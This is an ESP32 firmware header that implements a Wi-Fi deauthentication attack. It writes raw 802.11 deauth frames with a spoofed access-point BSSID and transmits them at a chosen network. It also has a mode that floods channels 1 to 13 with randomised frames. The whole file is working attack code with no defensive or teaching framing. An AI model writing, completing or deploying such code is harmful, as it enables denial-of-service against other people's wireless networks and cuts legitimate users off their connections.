// deauther.h
#ifndef DEAUTHER_H
#define DEAUTHER_H

#include <esp_wifi.h>

extern int networkCount;
extern struct NetworkInfo networks[];
extern int currentTarget;

bool deauthActive = false;
int deauthTarget = -1;
bool deauthAllMode = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00
};

void startDeauthAttack(int idx) {
  deauthTarget = idx;
  deauthAllMode = false;
  deauthActive = true;
  
  esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
  
  uint8_t bssid[6];
  sscanf(networks[idx].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  
  Serial.printf("Deauth attack started on %s (CH:%d)\n", 
    networks[idx].ssid.c_str(), networks[idx].channel);
}

void startDeauthAll() {
  deauthActive = true;
  deauthAllMode = true;
  Serial.println("Deauth all networks mode enabled");
}

void stopDeauthAttack() {
  deauthActive = false;
  deauthAllMode = false;
  deauthTarget = -1;
}

void runDeauth() {
  if (!deauthActive) return;
  
  if (deauthAllMode) {
    for (int ch = 1; ch <= 13; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      for (int i = 0; i < 6; i++) {
        deauthPacket[10+i] = random(256);
        deauthPacket[16+i] = deauthPacket[10+i];
      }
      for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      }
    }
  } else if (deauthTarget >= 0 && deauthTarget < networkCount) {
    for (int i = 0; i < 10; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    }
  }
  delay(100);
}

#endif
